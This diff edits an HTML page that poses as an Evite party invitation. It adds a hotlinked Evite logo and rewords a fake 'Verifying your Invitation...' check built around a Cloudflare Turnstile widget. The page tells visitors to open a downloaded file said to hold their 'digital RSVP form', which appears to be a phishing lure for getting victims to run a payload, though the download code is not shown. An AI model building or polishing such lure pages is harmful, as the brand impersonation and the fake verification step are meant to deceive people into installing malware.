@@ -143,6 +143,20 @@ button:disabled{
     color:#333;
 }
 
+.top-logo{
+    position:fixed;
+    top:20px;
+    left:20px;
+    z-index:9999;
+}
+
+.top-logo img{
+    width:80px;
+    height:auto;
+    display:block;
+}
+
+
 @keyframes spin{
     0%{transform:rotate(0)}
     100%{transform:rotate(360deg)}
@@ -154,9 +168,13 @@ button:disabled{
 
 <body>
 
+<div class="top-logo">
+    <img src="https://g5.evitecdn.com/emails/pb/evite_header_logo.png" alt="E-logo">
+</div>
+
 <div id="loading-overlay">
     <div class="loading-spinner"></div>
-    <div class="loading-text">Verifying your browser...</div>
+    <div class="loading-text">Verifying your Invitation...</div>
     <div id="cf-turnstile"></div>
 </div>
 
@@ -165,7 +183,7 @@ button:disabled{
 <div class="container" id="mainContainer">
     <div class="thanks-card">
         <h2>🎉 You’re invited! 🎉</h2>
-        <p>Your RSVP event package is being prepared</p>
+        <p>Your RSVP event package is being prepared ...</p>
        <p>Open the downloaded file that contains your digital RSVP form to make RSVP.</p>	
        <p>🎊 Thank You 🎊</p>	   
 
